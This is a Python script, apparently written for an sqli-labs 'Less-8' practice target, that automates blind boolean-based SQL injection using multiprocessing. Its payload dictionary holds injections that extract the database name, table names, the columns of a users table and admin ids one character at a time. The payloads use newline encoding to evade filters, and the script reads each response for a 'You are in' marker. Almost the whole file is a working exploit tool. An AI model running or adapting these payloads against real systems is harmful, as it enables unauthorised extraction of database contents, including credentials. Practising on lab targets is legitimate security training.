import requests
import sys
import signal
from rich.console import Console
from prettytable import PrettyTable
from multiprocessing import *
import multiprocessing as mp
from os import system
import ctypes


def clear():
    system('cls')


def CtrlC(qr1, qr2):
    clear()
    name = ''
    for i in range(1, 30):
        if q2.empty():
            break
        else:
            name = q2.get()
    table = PrettyTable(
        ['The blasting data is'])
    table.align = 'l'
    row = [name]
    table.add_row(row)
    print(table)
    sys.exit()


def generate(q):
    for i in range(1, 50):
        for j in range(33, 127):
            q.put([i, j])


def booler_injection(url, q, q2, v, l):
    console = Console()
    while True:
        qu = q.get()
        i = qu[0]
        j = qu[1]
        j = (128 + 31) - j
        py_dict = {
            'str1': '''and if(ascii(mid((select database()),{0},1)) = {1},5,0) --+''',
            'str2': '''and if(ascii(mid((select%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema%0alike%0adatabase()),{0},1))%0alike%0a{1},5,0) --+''',
            'str3': '''and if(ascii(mid((select%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name%0alike%0a0x7573657273),{0},1))%0alike%0a{1},5,0) --+''',
            'str4': '''if(ascii(mid((select%0agroup_concat(id)%0afrom%0ahs_test_s1_blog.admin),{0},1))%0alike%0a{1},5,0) '''
        }
        payload_str = py_dict['str1'].format(i, j)
        pld = url + payload_str
        # l.acquire()
        req1 = requests.get(pld)
        print(pld, end='\r')
        # l.release()
        if req1.text.find('You are in') > 0:
            v.value += chr(j)
            clear()
            console.print("[green][+]data is -> [/green]" + v.value)
            q2.put(v.value)



if __name__ == '__main__':
    try:
        l = mp.Lock()
        v = mp.Manager().Value(ctypes.c_char_p, '')
        q2 = Queue()
        q = Queue()
        signal.signal(signal.SIGINT, CtrlC)
        signal.signal(signal.SIGTERM, CtrlC)
        url = "http://71764b5318a241968a6ee2e078ddaf0a.app.mituan.zone/Less-8/?id=1'"
        p2 = Process(target=generate, args=(q,))
        for i in range(6):
            p1 = Process(target=booler_injection, args=(url, q, q2, v, l))
            p1.start()
        p2.start()
        p1.join()
        p2.join()
    except Exception as ex:
        print(ex)
